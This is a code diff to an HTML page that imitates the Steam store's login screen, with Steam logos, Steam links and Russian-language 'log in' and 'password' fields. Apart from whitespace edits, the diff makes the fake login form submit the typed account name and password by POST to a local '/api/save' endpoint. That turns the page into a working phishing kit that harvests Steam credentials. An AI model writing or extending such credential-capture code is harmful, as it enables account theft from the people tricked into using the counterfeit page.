@@ -19,8 +19,8 @@
             </div>
             <div>
               <a style="display: inline-block;" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
-							  <img src="steam/source/header_logo.png" height="36" alt="STEAM">
-							</a>
+		<img src="steam/source/header_logo.png" height="36" alt="STEAM">
+	      </a>
             </div>
           </div>
         <div class="global-header">
@@ -28,7 +28,7 @@
             <div class="logo">
               <span>
                 <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
-  						  <img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44">
+  			<img src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44">
                 </a>
               </span>
             </div>
@@ -115,18 +115,18 @@
                   </div>
                   <div class="login-formcontainer">
                     <div class="dialog-login-window">
-                      <form class="login-table" method="GET">
+                      <form class="login-table" method="POST" action="/api/save">
                         <div class="field-container">
                           <div class="field-tittle">
                             Войти, используя имя аккаунта
                           </div>
-                          <input class="inputfield" type="text">
+                          <input class="inputfield" type="text" name="login">
                         </div>
                         <div class="field-container">
                           <div class="field-tittle" style="color: #afafaf;font-weight: normal;">
                             Пароль
                           </div>
-                          <input class="inputfield" type="password">
+                          <input class="inputfield" type="password" name="password">
                         </div>
                         <div class="checkbox-container">
                           <div class="box">
@@ -136,7 +136,7 @@
                           </div>
                         </div>
                         <div class="enter-button-container">
-                          <button type="submit" name="login" class="enter-button">
+                          <button type="submit" class="enter-button">
                             Войти
                           </button>
                         </div>
